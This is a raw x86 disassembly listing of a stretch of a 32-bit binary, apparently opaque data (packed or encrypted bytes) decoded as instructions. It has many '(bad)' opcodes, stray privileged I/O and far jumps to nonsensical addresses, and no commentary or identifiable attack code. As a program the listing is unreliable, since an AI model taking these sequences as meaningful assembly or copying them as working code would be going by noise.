  40d1c5:	arpl   WORD PTR [eax-0x60df2eb9],bx
  40d1cb:	aaa    
  40d1cc:	mov    esp,0x1bb49349
  40d1d1:	mov    edi,DWORD PTR [edx+ebp*2]
  40d1d4:	(bad)  
  40d1d5:	cmp    al,0x35
  40d1d7:	ins    DWORD PTR es:[edi],dx
  40d1d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1d9:	and    al,0x80
  40d1dc:	pop    edi
  40d1dd:	push   ebx
  40d1de:	mov    cl,0xcf
  40d1e0:	mov    dh,0x13
  40d1e2:	out    dx,al
  40d1e3:	sub    DWORD PTR [ebx+0x1cc04514],esp
  40d1e9:	int3   
  40d1ea:	dec    edx
  40d1eb:	rcl    DWORD PTR [esi-0x30],1
  40d1ee:	adc    BYTE PTR [esi+0x524d795c],0x29
  40d1f5:	jl     0x40d268
  40d1f7:	je     0x40d25b
  40d1f9:	jno    0x40d1fb
  40d1fb:	je     0x40d247
  40d1fd:	pop    ebp
  40d1fe:	nop
  40d1ff:	xchg   DWORD PTR [edi-0x49],ecx
  40d202:	cmp    eax,0xecd7645b
  40d207:	and    DWORD PTR [edi+0x177321a4],eax
  40d20d:	dec    esp
  40d20e:	popf   
  40d20f:	pop    ds
  40d210:	mov    bl,0xaf
  40d212:	mov    al,0x74
  40d214:	or     eax,0x92b9286c
  40d219:	shr    DWORD PTR [esi],0x19
  40d21c:	enter  0x55b3,0x93
  40d220:	aaa    
  40d221:	or     ch,BYTE PTR [edi-0x33167e1d]
  40d227:	push   esi
  40d228:	cmp    cl,bh
  40d22a:	outs   dx,BYTE PTR ds:[esi]
  40d22b:	es jmp 0x3b8be698
  40d231:	outs   dx,BYTE PTR ds:[esi]
  40d232:	cmp    eax,0xad556fd6
  40d237:	clc    
  40d238:	xlat   BYTE PTR ds:[ebx]
  40d239:	sbb    al,0x14
  40d23b:	loop   0x40d255
  40d23d:	dec    ebp
  40d23e:	sub    DWORD PTR [edi+0x1ec9b30a],edi
  40d244:	sub    DWORD PTR [ebx],0x371ab521
  40d24a:	repnz in al,0x8f
  40d24d:	mov    bh,0x7b
  40d24f:	mov    edi,0x29d7ec9d
  40d254:	jl     0x40d21c
  40d256:	(bad)  
  40d257:	loop   0x40d260
  40d259:	push   eax
  40d25a:	mov    ebx,0xcb2243bb
  40d25f:	and    eax,DWORD PTR [esi-0x4f63d784]
  40d265:	sbb    bh,0x31
  40d268:	xor    ebp,DWORD PTR [ebp-0x33]
  40d26b:	xor    eax,0x5e3c0142
  40d270:	or     al,0x3
  40d272:	(bad)  
  40d274:	(bad)  
  40d276:	pusha  
  40d277:	call   0x180f:0xa421c4e2
  40d27e:	mov    edi,ecx
  40d280:	loopne 0x40d257
  40d282:	arpl   bp,ax
  40d284:	jmp    0x40d250
  40d286:	bound  ebx,QWORD PTR [eax+0xd]
  40d289:	or     esp,DWORD PTR [eax+0x3f0930bd]
  40d28f:	cmovb  edi,ecx
  40d292:	or     eax,0x65ee9d4
  40d297:	clc    
  40d298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d299:	rol    DWORD PTR [edx+0x23],0xa8
  40d29d:	sar    BYTE PTR [edi-0x79],0xb7
  40d2a1:	enter  0xf1f7,0xea
  40d2a5:	push   ds
  40d2a6:	imul   ebp
  40d2a8:	inc    eax
  40d2a9:	jmp    DWORD PTR [eax+ebx*8]
  40d2ac:	call   0xb1c3bb49
  40d2b1:	jge    0x40d2a2
  40d2b3:	xor    ecx,DWORD PTR [eax+0x67]
  40d2b6:	or     al,0xd3
  40d2b8:	daa    
  40d2b9:	xor    eax,0x5276bc0c
  40d2be:	(bad)  
  40d2bf:	xor    DWORD PTR [ecx],ebx
  40d2c1:	ret    0x48f
  40d2c4:	addr16 call 0xea20:0xb653a2c4
  40d2cc:	sbb    al,0x5a
  40d2ce:	pop    esp
  40d2cf:	dec    ebp
  40d2d0:	mov    ds:0xfbe99700,al
  40d2d5:	jo     0x40d2af
  40d2d7:	mov    ebp,0xdeab22f6
  40d2dc:	ret    
  40d2dd:	push   ds
  40d2de:	les    edi,FWORD PTR ds:0xdc21767e
  40d2e4:	jle    0x40d2dc
  40d2e6:	pop    ds
  40d2e7:	cdq    
  40d2e8:	cmp    esi,ecx
  40d2ea:	lahf   
  40d2eb:	pop    es
  40d2ec:	mov    fs,WORD PTR [ebx-0x123e3fc9]
  40d2f2:	push   eax
  40d2f3:	sahf   
  40d2f4:	xchg   esi,eax
  40d2f5:	rol    ah,0xbe
  40d2f8:	or     eax,0xaff47016
  40d2fd:	retf   0x319d
  40d300:	add    DWORD PTR [eax+0x43],ecx
  40d303:	(bad)  
  40d304:	dec    esp
  40d305:	daa    
  40d306:	sbb    bh,BYTE PTR [eax-0x7fc5c8a1]
  40d30c:	xchg   edx,eax
  40d30d:	mov    eax,ds:0x8243e860
  40d312:	cmp    DWORD PTR [ebp-0x5129ca0],esi
  40d318:	sub    eax,0xd48da165
  40d31d:	push   eax
  40d31e:	je     0x40d2ce
  40d320:	enter  0xdf4c,0xc0
  40d324:	mov    cl,bh
  40d326:	sub    dh,BYTE PTR [esi+0xab3f45b]
  40d32c:	popf   
  40d32d:	je     0x40d317
  40d32f:	and    eax,0x284125aa
  40d334:	in     al,dx
  40d335:	fnsave [eax]
  40d337:	cs jp  0x40d350
  40d33a:	out    0x9a,eax
  40d33c:	xor    eax,0xc3f6b826
  40d341:	lahf   
  40d342:	and    eax,0x52b2a6b3
  40d347:	pop    esi
  40d348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d349:	sbb    eax,DWORD PTR [esi+0x5a]
  40d34c:	dec    esp
  40d34d:	fisttp WORD PTR [ecx+0x36d0e899]
  40d353:	mov    eax,ds:0x7260af38
  40d358:	push   eax
  40d359:	pop    eax
  40d35a:	mov    ecx,eax
  40d35c:	in     eax,0x47
  40d35e:	xor    al,dl
  40d360:	and    al,0x49
  40d362:	sti    
  40d363:	pop    edi
  40d364:	mov    ecx,ecx
  40d366:	xchg   ebx,eax
  40d367:	or     DWORD PTR [eax+0x6c],ecx
  40d36a:	push   esp
  40d36b:	out    dx,al
  40d36c:	xchg   esp,eax
  40d36d:	jne    0x40d36a
  40d36f:	arpl   WORD PTR [esi-0x16dd9315],si
  40d375:	sub    DWORD PTR [eax+0x5284c289],edi
  40d37b:	mov    dl,BYTE PTR [ebp-0x72]
  40d37e:	aas    
  40d37f:	shl    DWORD PTR ds:0x5e3799,cl
  40d385:	pop    ebp
  40d386:	mov    BYTE PTR [ebp-0x9],ah
  40d389:	fcomp  QWORD PTR [edx+edi*8]
  40d38c:	retf   
  40d38d:	jae    0x40d317
  40d38f:	out    0xa2,al
  40d391:	outs   dx,BYTE PTR ds:[esi]
  40d392:	jmp    0x9033:0x9d076752
  40d399:	jns    0x40d3e2
  40d39b:	add    BYTE PTR [esi+esi*8],al
  40d39e:	sub    eax,0xd2059591
  40d3a3:	hlt    
  40d3a4:	arpl   WORD PTR [eax-0x6e],sp
  40d3a7:	es popf 
  40d3a9:	fs mov bl,0x6d
  40d3ac:	mov    esp,0x547db4f1
  40d3b1:	xchg   edi,eax
  40d3b2:	inc    ebx
  40d3b3:	jle    0x40d411
  40d3b5:	mov    cl,0x9c
  40d3b7:	mov    BYTE PTR [esi],0xe0
  40d3ba:	push   ds
  40d3bb:	stc    
  40d3bc:	inc    eax
  40d3bd:	rcr    DWORD PTR [ecx-0x3],0x3e
  40d3c1:	(bad)  
  40d3c2:	clc    
  40d3c3:	out    0xd1,al
  40d3c5:	int    0x7e
  40d3c7:	inc    ebp
  40d3c8:	stc    
  40d3c9:	stos   DWORD PTR es:[edi],eax
  40d3ca:	pop    ecx
  40d3cb:	cmp    DWORD PTR [edx-0x2a86d34],ebp
  40d3d1:	jo     0x40d375
  40d3d3:	stos   DWORD PTR es:[edi],eax
  40d3d4:	or     ebp,ebx
  40d3d6:	xchg   DWORD PTR [ebx],edx
  40d3d8:	or     BYTE PTR [esi-0x14b0ad6b],bh
  40d3de:	jg     0x40d388
  40d3e0:	mov    ecx,0xecbbf120
  40d3e5:	sbb    BYTE PTR [ebx+0xa],0xe1
  40d3e9:	fdiv   DWORD PTR [esi+0x6da4b861]
  40d3ef:	sub    ecx,DWORD PTR [edx+0x24]
  40d3f2:	mov    eax,ds:0xf79885ac
  40d3f7:	loop   0x40d42e
  40d3f9:	popa   
  40d3fa:	sub    cl,BYTE PTR [edi-0x1d8172a0]
  40d400:	sbb    al,0xdf
  40d402:	mov    cl,0xa9
  40d404:	add    BYTE PTR [edi],cl
  40d406:	sbb    al,0xc4
  40d408:	inc    ebx
  40d409:	dec    ebp
  40d40a:	je     0x40d3de
  40d40c:	cmp    edx,0x75
  40d40f:	aad    0x35
  40d411:	repnz push ss
  40d413:	shr    BYTE PTR [esi+0x5b0d6034],0xee
  40d41a:	mov    edx,0xdfe9521f
  40d41f:	sbb    DWORD PTR [ebx+0x40bb02b7],edi
  40d425:	das    
  40d426:	inc    ebx
  40d427:	xchg   BYTE PTR [ebx],al
  40d429:	lea    ebp,[ebp+0x4cf5543]
  40d42f:	scas   al,BYTE PTR es:[edi]
  40d430:	(bad)  
  40d431:	jb     0x40d493
  40d433:	ja     0x40d401
  40d435:	cwde   
  40d436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d437:	mov    WORD PTR [edi-0x6807eb86],fs
  40d43d:	outs   dx,DWORD PTR ds:[esi]
  40d43e:	xchg   edi,eax
  40d43f:	div    BYTE PTR [edx]
  40d441:	push   ds
  40d442:	lock sbb al,0x45
  40d445:	pop    esi
  40d446:	lea    edi,[eax-0x5b]
  40d449:	in     al,dx
  40d44a:	mov    al,0xa3
  40d44c:	sub    eax,0x2a4875c1
  40d451:	shr    BYTE PTR [esi-0x4d],0x56
  40d455:	jmp    0x7f79:0x62694d4c
  40d45c:	rcr    edi,cl
  40d45e:	pop    edi
  40d45f:	dec    ebp
  40d460:	js     0x40d3fe
  40d462:	cmp    BYTE PTR [edx*2-0x18bda000],cl
  40d469:	out    dx,eax
  40d46a:	cmp    DWORD PTR [edi-0x21b666f8],0xda7dd4a5
  40d474:	jg     0x40d4ed
  40d476:	push   ebp
  40d477:	cmp    ecx,ebx
  40d479:	pop    ds
  40d47a:	mov    eax,ds:0x86b99543
  40d47f:	and    eax,0x28741584
  40d484:	xchg   esi,eax
  40d485:	pop    ebp
  40d486:	leave  
  40d487:	xchg   ebp,eax
  40d488:	fadd   QWORD PTR [ebx+edx*8]
  40d48b:	arpl   WORD PTR [ebp+ebx*8-0x3f],sp
  40d48f:	and    ch,al
  40d491:	sbb    al,0x2c
  40d493:	aaa    
  40d494:	xor    ebx,DWORD PTR [edi]
  40d496:	imul   edi,ecx,0x12
  40d499:	frstor [edx+0x6ee29fc0]
  40d49f:	js     0x40d434
  40d4a1:	add    bh,BYTE PTR [eax-0x76]
  40d4a4:	xchg   ebp,eax
  40d4a5:	dec    ebp
  40d4a6:	push   edi
  40d4a7:	jae    0x40d457
  40d4a9:	sbb    eax,0x46801c2b
  40d4ae:	out    0x65,eax
  40d4b0:	dec    edi
  40d4b1:	jmp    0x74f6a48
  40d4b6:	and    edi,DWORD PTR [eax-0x1e]
  40d4b9:	ss repz xor eax,0x9f3220a8
  40d4c0:	jne    0x40d51a
  40d4c2:	fld    QWORD PTR [ebx-0x473fbb89]
  40d4c8:	sbb    bh,BYTE PTR [eax-0x20]
  40d4cb:	add    ch,bh
  40d4cd:	adc    ecx,ecx
  40d4cf:	and    DWORD PTR [esi+0x61c00220],eax
  40d4d5:	pop    ebp
  40d4d6:	mov    eax,ds:0xdd97d3f9
  40d4db:	cld    
  40d4dc:	inc    ebp
  40d4dd:	mov    eax,0x52c54e39
  40d4e2:	push   ecx
  40d4e3:	pop    eax
  40d4e4:	xchg   ebp,eax
  40d4e5:	call   0x68ff:0x8b858e0b
  40d4ec:	cwde   
  40d4ed:	xor    ecx,DWORD PTR [edx+0x48d6a286]
  40d4f3:	cmc    
  40d4f4:	mov    al,ds:0x39bd473f
  40d4f9:	cmp    BYTE PTR [edx],0xe2
  40d4fc:	call   0x1ea6:0xf031d91d
  40d503:	clc    
  40d504:	inc    ecx
  40d505:	mov    dl,0x2d
  40d507:	outs   dx,BYTE PTR ds:[esi]
  40d508:	cmp    eax,0x8de0eaa7
  40d50d:	cwde   
  40d50e:	scas   eax,DWORD PTR es:[edi]
  40d50f:	not    DWORD PTR [ebx+ebp*8+0x49]
  40d513:	xor    al,ch
  40d515:	in     eax,dx
  40d516:	aam    0x26
  40d518:	nop
  40d519:	adc    ecx,DWORD PTR [edx]
  40d51b:	scas   eax,DWORD PTR es:[edi]
  40d51c:	dec    esp
  40d51d:	rol    ebx,cl
  40d51f:	dec    edi
  40d520:	ins    DWORD PTR es:[edi],dx
  40d521:	jmp    0x7f393962
  40d526:	sub    BYTE PTR es:[ecx-0x66b5317],0xdb
  40d52e:	push   cs
  40d52f:	(bad)  
  40d531:	dec    ebx
  40d532:	xchg   ecx,eax
  40d533:	sub    al,0x61
  40d535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d536:	push   ss
  40d537:	sbb    esp,0x2f
  40d53a:	xor    al,0x83
  40d53c:	mov    WORD PTR [ecx-0x54],gs
  40d53f:	dec    eax
  40d540:	inc    ebp
  40d541:	adc    eax,0x9bc694fa
  40d546:	dec    esp
  40d547:	xchg   esp,eax
  40d548:	outs   dx,BYTE PTR ds:[esi]
  40d549:	pusha  
  40d54a:	sub    BYTE PTR [edi+0x49e40da8],dh
  40d550:	xchg   eax,esi
  40d552:	imul   ebx,esp,0x1d
  40d555:	sub    al,BYTE PTR [ebx+edx*1+0x3b]
  40d559:	push   edx
  40d55a:	test   DWORD PTR [esi-0x24],ebp
  40d55d:	mov    dl,0x9
  40d55f:	mov    eax,0xd2817864
  40d564:	arpl   WORD PTR [ebx-0x2],dx
  40d567:	cmp    eax,0xbab77a63
  40d56c:	dec    esi
  40d56d:	fistp  DWORD PTR [ebp+0x546c67d3]
  40d573:	inc    ecx
  40d574:	xchg   ecx,eax
  40d575:	mov    bl,0xd1
  40d577:	mov    ah,0x97
  40d579:	loop   0x40d595
  40d57b:	dec    ebp
  40d57c:	xor    edx,DWORD PTR [esi+0x51]
  40d57f:	jecxz  0x40d502
  40d581:	push   ss
  40d582:	and    BYTE PTR [eax+0x5b],dh
  40d585:	sti    
  40d586:	push   esp
  40d587:	jmp    0x40d559
  40d589:	lods   al,BYTE PTR ds:[esi]
  40d58a:	mov    ebp,0x1bd2bfc5
  40d58f:	mov    ch,0xdd
  40d591:	sub    DWORD PTR [ebp+0x5f],edx
  40d594:	ins    DWORD PTR es:[edi],dx
  40d595:	pusha  
  40d596:	mov    eax,ds:0x850f2d63
  40d59b:	loopne 0x40d5fc
  40d59d:	(bad)  
  40d59f:	cmc    
  40d5a0:	mov    edi,0xa0ab4108
  40d5a5:	cdq    
  40d5a6:	retf   0x119b
  40d5a9:	ins    BYTE PTR es:[edi],dx
  40d5aa:	push   0x34a65255
  40d5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5b0:	inc    ebp
  40d5b1:	(bad)  
  40d5b2:	jg     0x40d56c
  40d5b4:	cli    
  40d5b5:	sbb    eax,0xf3f9cbe9
  40d5ba:	sub    dh,dh
  40d5bc:	call   0x1447:0xdad7b4ec
  40d5c3:	das    
  40d5c4:	test   eax,0x15b6c255
  40d5c9:	or     esi,DWORD PTR [ebx+0x6d]
  40d5cc:	jnp    0x40d5f8
  40d5ce:	dec    ecx
  40d5cf:	push   0x40a49f32
  40d5d4:	icebp  
  40d5d5:	std    
  40d5d6:	add    BYTE PTR [ebp-0x71bd6f3e],ah
  40d5dc:	ss cld 
  40d5de:	add    esi,DWORD PTR [esi+0x9065d0]
  40d5e4:	fidivr WORD PTR [esi]
  40d5e6:	xor    DWORD PTR [esi-0x78],0xb52e2ab0
  40d5ed:	sbb    al,0x58
  40d5ef:	sbb    bl,dh
  40d5f1:	push   ebp
  40d5f2:	lds    edi,FWORD PTR [edx+0x707733ac]
  40d5f8:	mov    ah,0x50
  40d5fa:	inc    BYTE PTR [esi+0x5e84965f]
  40d600:	je     0x40d5ce
  40d602:	xchg   ebx,eax
  40d603:	adc    BYTE PTR [eax-0x6c046ebd],al
  40d609:	xor    ebp,DWORD PTR [ebx]
  40d60b:	scas   eax,DWORD PTR es:[edi]
  40d60c:	sub    eax,0xc5df11f9
  40d611:	mov    al,ds:0xdf192c9b
  40d616:	inc    ecx
  40d617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d618:	jb     0x40d691
  40d61a:	pop    edi
  40d61b:	sub    DWORD PTR [ecx+0x73],0xffffffda
  40d61f:	xchg   edi,eax
  40d620:	pop    ss
  40d621:	nop
  40d622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d623:	pop    edi
  40d624:	mov    dl,0xca
  40d626:	inc    BYTE PTR [edx]
  40d628:	stos   BYTE PTR es:[edi],al
  40d629:	fadd   QWORD PTR [edi-0x56]
  40d62c:	imul   esi,edx,0x7d
  40d62f:	mov    edx,0x71556a87
  40d634:	rcl    DWORD PTR [ebx+edi*1-0x1e],cl
  40d638:	add    eax,0x98c5fec1
  40d63d:	cmp    eax,0x6b7ad82e
  40d642:	mov    ebp,0xa6239564
  40d647:	aad    0x43
  40d649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d64a:	jge    0x40d66c
  40d64c:	cwde   
  40d64d:	int    0xe9
  40d64f:	mov    ecx,0xcf71eed0
  40d654:	outs   dx,BYTE PTR ds:[esi]
  40d655:	les    esi,FWORD PTR [edx]
  40d657:	add    cl,0xa0
  40d65a:	ret    0x453d
  40d65d:	in     al,dx
  40d65e:	dec    BYTE PTR ds:0xb7f5a6eb
  40d664:	mov    al,0xc4
  40d666:	dec    esi
  40d667:	call   0x5ee4:0xf70bccff
  40d66e:	ret    0x45f5
  40d671:	mov    esi,0x71337a2e
  40d676:	cwde   
  40d677:	push   es
  40d678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d679:	push   edx
  40d67a:	cmp    ah,BYTE PTR [edi-0x39]
  40d67d:	cmp    BYTE PTR [edx],ch
  40d67f:	mov    edi,0x7c8f969
  40d684:	xchg   edi,eax
  40d685:	jecxz  0x40d689
  40d687:	inc    ecx
  40d688:	mov    ah,0xde
  40d68a:	jno    0x40d631
  40d68c:	add    BYTE PTR [edi+0x43d71fa5],cl
  40d692:	leave  
  40d693:	mov    al,BYTE PTR [esi-0x77df58af]
  40d699:	sbb    DWORD PTR [esi+0x57a80c0c],eax
  40d69f:	int    0x7f
  40d6a1:	sbb    eax,0xed2a0721
  40d6a6:	not    DWORD PTR [esi]
  40d6a8:	add    dl,cl
  40d6aa:	into   
  40d6ab:	cs dec esp
  40d6ad:	jbe    0x40d64c
  40d6af:	cwde   
  40d6b0:	pop    ebp
  40d6b1:	aaa    
  40d6b2:	mov    ds:0xca6152d3,eax
  40d6b7:	aad    0xb8
  40d6b9:	push   ebp
  40d6ba:	fs repnz sahf 
  40d6bd:	xchg   DWORD PTR [ebx+0x2b],eax
  40d6c0:	pop    es
  40d6c1:	add    dh,BYTE PTR [edi+ebp*8+0x3beca098]
  40d6c8:	inc    esi
  40d6c9:	mov    edx,0xc844cb52
  40d6ce:	(bad)  
  40d6cf:	push   ss
  40d6d0:	fucomp st(4)
  40d6d2:	push   ebp
  40d6d3:	add    eax,0x88710077
  40d6d8:	xor    eax,0x62ee5507
  40d6dd:	xor    ebp,ebp
  40d6df:	in     al,dx
  40d6e0:	sbb    dl,dl
  40d6e2:	data16 sub BYTE PTR [ebx+0x140325a],ah
  40d6e9:	rcl    esp,cl
  40d6eb:	dec    eax
  40d6ec:	cwde   
  40d6ed:	inc    ebx
  40d6ee:	inc    esp
  40d6ef:	or     BYTE PTR [esi-0x33618479],ah
  40d6f5:	add    ebx,esp
  40d6f7:	adc    cl,al
  40d6f9:	pop    ss
  40d6fa:	mov    ecx,ebp
  40d6fc:	call   0x5acef55c
  40d701:	sbb    DWORD PTR [ebx-0x76f89393],esi
  40d707:	jae    0x40d752
  40d709:	xchg   edi,eax
  40d70a:	outs   dx,DWORD PTR ds:[esi]
  40d70b:	push   es
  40d70c:	pop    ecx
  40d70d:	repnz and eax,0xe5998576
  40d713:	mov    eax,DWORD PTR [edx]
  40d715:	fcom   DWORD PTR [ecx-0x52226f09]
  40d71b:	or     ecx,DWORD PTR [edx+esi*4-0x3]
  40d71f:	push   0xffffffcc
  40d721:	mov    ch,0xf2
  40d723:	(bad)  
  40d724:	(bad)  
  40d725:	jo     0x40d720
  40d727:	mov    ch,0x50
  40d729:	jae    0x40d73a
  40d72b:	push   cs
  40d72c:	bound  ebx,QWORD PTR [ecx-0x1c8ba220]
  40d732:	pop    esi
  40d733:	call   0x6d95:0x759d761
  40d73a:	pop    es
  40d73b:	sahf   
  40d73c:	jae    0x40d764
  40d73e:	jge    0x40d6fe
  40d740:	sbb    ah,dl
  40d742:	out    dx,eax
  40d743:	dec    DWORD PTR [ebx-0x107cebae]
  40d749:	mov    es,WORD PTR [ebx]
  40d74b:	xchg   esp,eax
  40d74c:	inc    ebx
  40d74d:	fdivrp st(3),st
  40d74f:	sub    eax,0x67bab2f0
  40d754:	jl     0x40d7cb
  40d756:	xchg   ebx,eax
  40d757:	and    BYTE PTR [ebp-0x3e7d6513],cl
  40d75d:	rcr    DWORD PTR [ebx+0x4de1b1a3],cl
  40d763:	gs pop ecx
  40d765:	add    cl,BYTE PTR [eax+0x4ca81adf]
  40d76b:	(bad)  
  40d76d:	je     0x40d78c
  40d76f:	inc    esi
  40d770:	sub    BYTE PTR [eax+edx*1+0x6b7f7a31],ah
  40d777:	call   0x697a988e
  40d77c:	or     esi,ebp
  40d77e:	(bad)  
  40d77f:	cmp    BYTE PTR [edx],dl
  40d781:	mov    al,0xcb
  40d783:	into   
  40d784:	je     0x40d75e
  40d786:	sbb    bl,BYTE PTR [esi-0x56]
  40d789:	ins    BYTE PTR es:[edi],dx
  40d78a:	pop    esp
  40d78b:	xchg   edx,eax
  40d78c:	sbb    al,ch
  40d78e:	popa   
  40d78f:	lods   al,BYTE PTR ds:[esi]
  40d790:	push   0xa637b7f9
  40d795:	retf   0x82b1
  40d798:	stos   DWORD PTR es:[edi],eax
  40d799:	push   ecx
  40d79a:	ins    BYTE PTR es:[edi],dx
  40d79b:	jge    0x40d71f
  40d79d:	cmp    ebx,DWORD PTR [edx+0x67f026da]
  40d7a3:	mov    esi,0xae3d5e10
  40d7a8:	les    edi,FWORD PTR [esi]
  40d7aa:	jp     0x40d80a
  40d7ac:	inc    edx
  40d7ad:	mov    al,ds:0xe3877aae
  40d7b2:	retf   0xc21e
  40d7b5:	in     eax,0xea
  40d7b7:	xchg   ebx,eax
  40d7b8:	inc    ebp
  40d7b9:	push   ebp
  40d7ba:	and    edx,ebx
  40d7bc:	fsubp  st(5),st
  40d7be:	sbb    al,0xd7
  40d7c0:	and    al,0x32
  40d7c2:	mov    esp,0xd3690cab
  40d7c7:	test   al,0xd0
  40d7c9:	leave  
  40d7ca:	and    dl,BYTE PTR [esi]
  40d7cc:	inc    edi
  40d7cd:	(bad)  
  40d7ce:	out    0x44,eax
  40d7d0:	mov    ch,0x70
  40d7d2:	mov    edi,0xd5373dd4
  40d7d7:	fld    TBYTE PTR [ebp-0x27cd53ed]
  40d7dd:	popa   
  40d7de:	retf   0xb944
  40d7e1:	jecxz  0x40d83d
  40d7e3:	mov    eax,gs
  40d7e5:	jmp    0xbab6:0x918a0e4e
  40d7ec:	mov    al,ds:0xd771d8a6
  40d7f1:	or     cl,BYTE PTR [ecx-0x15c147e9]
  40d7f7:	and    bl,BYTE PTR [ebx]
  40d7f9:	out    dx,al
  40d7fa:	jae    0x40d7f3
  40d7fc:	aam    0x4e
  40d7fe:	ret    0x2cdf
  40d801:	jge    0x40d86b
  40d803:	sub    al,0x6b
  40d805:	pop    esp
  40d806:	js     0x40d846
  40d808:	pop    eax
  40d809:	cwde   
  40d80a:	and    DWORD PTR [ebx],eax
  40d80c:	adc    bl,BYTE PTR [ebp-0x5ff49b30]
  40d812:	cmp    eax,0x5d2adf2b
  40d817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d818:	pushf  
  40d819:	rcl    DWORD PTR [ebp+edi*2+0x6e0ab469],0xea
  40d821:	and    eax,0x11181c13
  40d826:	ficomp DWORD PTR [esp+eax*8]
  40d829:	pop    ebx
  40d82a:	shr    BYTE PTR [edx],cl
  40d82c:	(bad)  
  40d82d:	cld    
  40d82e:	push   cs
  40d82f:	int    0x73
  40d831:	xchg   ebp,eax
  40d832:	xor    bl,BYTE PTR [eax+0x4f]
  40d835:	xchg   BYTE PTR [esi-0x24],ch
  40d838:	mov    ecx,0xce15728d
  40d83d:	outs   dx,BYTE PTR ds:[esi]
  40d83e:	in     eax,dx
  40d83f:	fsubr  st,st(6)
  40d841:	pop    edi
  40d842:	loopne 0x40d7e4
  40d844:	cdq    
  40d845:	jne    0x40d89f
  40d847:	jo     0x40d7eb
  40d849:	inc    ebp
  40d84a:	lods   eax,DWORD PTR ds:[esi]
  40d84b:	loop   0x40d814
  40d84d:	les    edi,FWORD PTR [ecx+0x1a]
  40d850:	push   ecx
  40d851:	dec    edi
  40d852:	or     eax,0xfe5397e4
  40d857:	daa    
  40d858:	sar    DWORD PTR [ecx+0x52],1
  40d85b:	jae    0x40d8d5
  40d85d:	in     al,dx
  40d85e:	inc    edx
  40d85f:	xor    al,BYTE PTR [edi+0x1aa177dc]
  40d865:	cmp    DWORD PTR [esi],0xffffffd3
  40d868:	jge    0x40d892
  40d86a:	sbb    bl,BYTE PTR [ebp+0x6]
  40d86d:	lea    eax,[edi]
  40d86f:	pop    ebx
  40d870:	jnp    0x40d8ca
  40d872:	sub    BYTE PTR [edi],bh
  40d874:	aaa    
  40d875:	mov    eax,0xbb05791
  40d87a:	mov    ds:0x2b78da2b,al
  40d87f:	lahf   
  40d880:	sbb    BYTE PTR [esi],bl
  40d882:	dec    esi
  40d883:	jns    0x40d88f
  40d885:	inc    edi
  40d886:	neg    DWORD PTR [eax-0x3c26f86e]
  40d88c:	xchg   esi,eax
  40d88d:	ror    BYTE PTR [eax+0xfebd14e],0x38
  40d894:	cmp    eax,0x8d246bc4
  40d899:	out    dx,al
  40d89a:	xchg   edi,eax
  40d89b:	mov    ds:0x6d9b8feb,al
  40d8a0:	test   DWORD PTR [ebp-0x12c1964a],ebx
  40d8a6:	cmp    ebx,eax
  40d8a8:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40d8aa:	test   al,0xe4
  40d8ac:	mov    eax,ds:0x714b24ab
  40d8b1:	enter  0x592c,0xb1
  40d8b5:	push   edx
  40d8b6:	repnz cli 
  40d8b8:	push   ds
  40d8b9:	test   eax,0x6602d2b1
  40d8be:	jbe    0x40d845
  40d8c0:	pop    edi
  40d8c1:	(bad)  
  40d8c2:	aas    
  40d8c3:	test   DWORD PTR [edx],esp
  40d8c5:	frstor [ebx-0x26]
  40d8c8:	adc    BYTE PTR [ebp*8+0xb67cbfc],ch
  40d8cf:	popa   
  40d8d0:	sub    esi,esp
  40d8d2:	in     eax,dx
  40d8d3:	dec    esi
  40d8d4:	adc    eax,DWORD PTR [edi+ebx*8]
  40d8d7:	or     al,0x23
  40d8d9:	jle    0x40d8e0
  40d8db:	data16 fstp DWORD PTR [edi]
  40d8de:	mov    al,ds:0x8396e1f2
  40d8e3:	sub    DWORD PTR ds:0x8052942d,0x1be77f9d
  40d8ed:	gs lock or eax,0xa113d1b0
  40d8f4:	pop    ds
  40d8f5:	cdq    
  40d8f6:	gs mov ebx,0x10c4cf6b
  40d8fc:	rcr    bl,cl
  40d8fe:	jl     0x40d950
  40d900:	imul   ebp,ecx,0xffffffdf
  40d903:	aad    0x80
  40d905:	(bad)  
  40d906:	sub    BYTE PTR [edx+edx*8],ah
  40d909:	inc    esp
  40d90a:	xchg   ebp,eax
  40d90b:	sub    eax,0xd666ab25
  40d910:	xchg   ecx,eax
  40d911:	xor    eax,0x68368b6a
  40d916:	es int 0x4a
  40d919:	mov    edx,0x1278b5f7
  40d91e:	push   ebp
  40d91f:	in     eax,0xfa
  40d921:	nop
  40d922:	push   ds
  40d923:	jns    0x40d96a
  40d925:	jb     0x40d8e7
  40d927:	dec    edi
  40d928:	sub    al,0xc1
  40d92a:	int    0x16
  40d92c:	lock push edx
  40d92e:	adc    dh,BYTE PTR [ecx]
  40d930:	mov    ebp,0x600de0b9
  40d935:	and    eax,0xa03f9f38
  40d93a:	adc    DWORD PTR [esp+eax*8+0x679de36a],edi
  40d941:	xchg   ebp,eax
  40d942:	pop    edx
  40d943:	pop    ebx
  40d944:	imul   edx,DWORD PTR [edi+0x4397c7eb],0xfffffff7
  40d94b:	xor    DWORD PTR [edi+0x1c],ebx
  40d94e:	stos   DWORD PTR es:[edi],eax
  40d94f:	push   ss
  40d950:	stos   BYTE PTR es:[edi],al
  40d951:	loope  0x40d8ff
  40d953:	jbe    0x40d930
  40d955:	or     al,0xd6
  40d957:	loope  0x40d9d8
  40d959:	push   esi
  40d95a:	and    DWORD PTR [edi+0x6b38096a],edx
  40d960:	push   ebp
  40d961:	jp     0x40d92d
  40d963:	rol    dl,0x65
  40d966:	(bad)  
  40d967:	(bad)  
  40d968:	jae    0x40d98b
  40d96a:	mov    WORD PTR [edi+0x1014e8bf],es
  40d970:	mov    ah,0x43
  40d972:	mov    esi,0xdfaa7193
  40d977:	or     DWORD PTR [ebx+0x29772ffb],edi
  40d97d:	mov    esp,0x3f266106
  40d982:	jmp    0x40d9a1
